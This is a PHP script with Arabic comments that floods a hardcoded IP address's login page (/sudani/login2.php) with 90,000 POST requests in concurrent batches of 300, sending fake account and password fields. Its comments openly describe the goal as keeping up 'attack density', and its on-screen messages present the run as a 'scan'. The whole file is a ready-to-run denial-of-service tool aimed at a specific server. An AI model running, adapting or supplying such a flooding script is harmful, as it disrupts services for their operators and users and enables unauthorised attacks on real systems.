<?php
// 1. تهيئة بيئة تدفق المخرجات ومنع توقف السكربت
ob_start();
set_time_limit(0);
ignore_user_abort(true);

header('Content-Type: text/html; charset=utf-8');
header('X-Accel-Encoding: none'); 

if (ob_get_length()) {
    ob_end_clean();
}
echo str_repeat(' ', 1024); 
flush();

// 2. هندسة بيانات الـ JSON والـ Form المدمجة
$target_url = "http://187.7.17.67/sudani/login2.php";

$payload_data = [
    'account'         => '123456789',
    'account_number'  => '123456789',
    'accountNumber'   => '123456789',
    'username'        => '123456789',
    'phone'           => '123456789',
    'phoneNumber'     => '123456789',
    'password'        => 'test_password'
];

$form_payload = http_build_query($payload_data);
$json_payload = json_encode($payload_data);

// 3. ضبط الكثافة الآمنة والمكثفة (تم تقليص الدفعة لتفادي انهيار الذاكرة وزيادة التكرار)
$concurrency_batch = 300;  // 300 طلب متزامن (العدد المثالي لطاقة السيرفر المجاني)
$total_batches     = 300;  // رفع التكرار إلى 300 دفعة متتالية للحفاظ على كثافة الهجوم الكلية (90,000 طلب)

echo "<h2>⚡ تشغيل محرك الحمل الذكي والمستقر الموجه للسيرفرات المجانية</h2>";
echo "⚙️ حالة الفحص: <b>مستقرة</b> | إجمالي الطلبات المستهدفة: <b>" . number_format($concurrency_batch * $total_batches) . " طلب</b>.<br>";
echo "---------------------------------------------------------------------------------<br><br>";
flush();

// 4. حلقة المعالجة المستمرة
for ($batch = 1; $batch <= $total_batches; $batch++) {
    
    echo "🚀 <b>إرسال الدفعة رقم [ {$batch} / {$total_batches} ]</b>... ";
    flush();
    
    $mh = curl_multi_init();
    $handles = [];

    for ($i = 0; $i < $concurrency_batch; $i++) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $target_url);
        curl_setopt($ch, CURLOPT_POST, true);
        
        if ($i % 2 === 0) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $json_payload);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'Content-Type: application/json',
                'Accept: application/json',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            ]);
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $form_payload);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'Content-Type: application/x-www-form-urlencoded',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            ]);
        }
        
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 4); // وقت انتهاء مرن لتنظيف قنوات الاتصال بسرعة
        
        curl_multi_add_handle($mh, $ch);
        $handles[] = $ch;
    }

    $running = null;
    do {
        curl_multi_exec($mh, $running);
        curl_multi_select($mh); 
    } while ($running > 0);

    $success_200 = 0;
    $other_codes = 0;

    foreach ($handles as $ch) {
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($http_code == 200) {
            $success_200++;
        } else {
            $other_codes++;
        }
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }

    curl_multi_close($mh);

    echo "📊 النتيجة: (✅ استجابة 200: <b>{$success_200}</b> | ❌ أخرى: <b>{$other_codes}</b>)<br>";
    flush();

    // فاصل زمني قصير جداً (30 مللي ثانية) لراحة الذاكرة
    usleep(30000); 
}

echo "<br>🏁 <b>اكتمل الفحص المستقر بنجاح تام ودون إجهاد لموارد الاستضافة.</b>";
flush();
?>
